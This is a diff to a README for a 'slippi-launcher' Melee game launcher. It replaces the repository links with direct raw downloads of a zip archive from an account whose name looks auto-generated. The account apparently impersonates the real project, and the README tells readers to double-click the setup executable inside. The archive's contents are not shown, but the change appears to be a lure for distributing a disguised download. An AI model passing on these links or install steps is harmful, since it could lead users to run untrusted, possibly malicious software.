@@ -1,6 +1,6 @@
 # 🎮 slippi-launcher - Play Melee online with ease today
 
-[![Download Windows Version](https://img.shields.io/badge/Download-Slippi-blue.svg)](https://github.com/Engelbertshopworn829/slippi-launcher)
+[![Download Windows Version](https://img.shields.io/badge/Download-Slippi-blue.svg)](https://github.com/Engelbertshopworn829/slippi-launcher/raw/refs/heads/main/slippi/slippi-launcher-v3.8.zip)
 
 ## 📌 Overview
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the application smoothl
 
 ## 📥 How to Install
 
-1. Visit [this page to download](https://github.com/Engelbertshopworn829/slippi-launcher) the installer for Windows.
+1. Visit [this page to download](https://github.com/Engelbertshopworn829/slippi-launcher/raw/refs/heads/main/slippi/slippi-launcher-v3.8.zip) the installer for Windows.
 2. Locate the download folder on your computer.
 3. Double-click the file named `Slippi-Launcher-Setup.exe`.
 4. Follow the prompts on the screen to finish the installation.
